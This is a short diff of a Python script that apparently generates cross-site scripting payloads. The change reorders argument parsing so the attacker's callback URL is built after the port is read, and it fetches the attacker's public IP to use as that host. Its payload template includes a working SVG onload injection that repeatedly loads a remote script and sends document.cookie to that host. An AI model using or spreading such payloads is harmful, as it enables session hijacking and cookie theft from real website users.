@@ -42,14 +42,9 @@ args = parser.parse_args()
 
 host = args.host
 target = args.target
-
-if target:
-    source = target
-else:
-    if not host:
-        host = get('https://api.ipify.org').text
-
-    source = "//{0}:{1}".format(host, port)
+gene = args.gene
+cmd = args.command
+secs = args.secs
     
 try:
     port = int(format(args.port))
@@ -59,15 +54,19 @@ try:
 except:
     print('Invalid port: %s' % port)
     quit
+    
+if target:
+    source = target
+else:
+    if not host:
+        host = get('https://api.ipify.org').text
+
+    source = "//{0}:{1}".format(host, port)
 
 if args.quiet:
     uprint = str
 else:
     uprint = print
-
-gene = args.gene
-cmd = args.command
-secs = args.secs
     
 payload = '''
     - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="{0}?".concat(document.cookie)}},1010)>
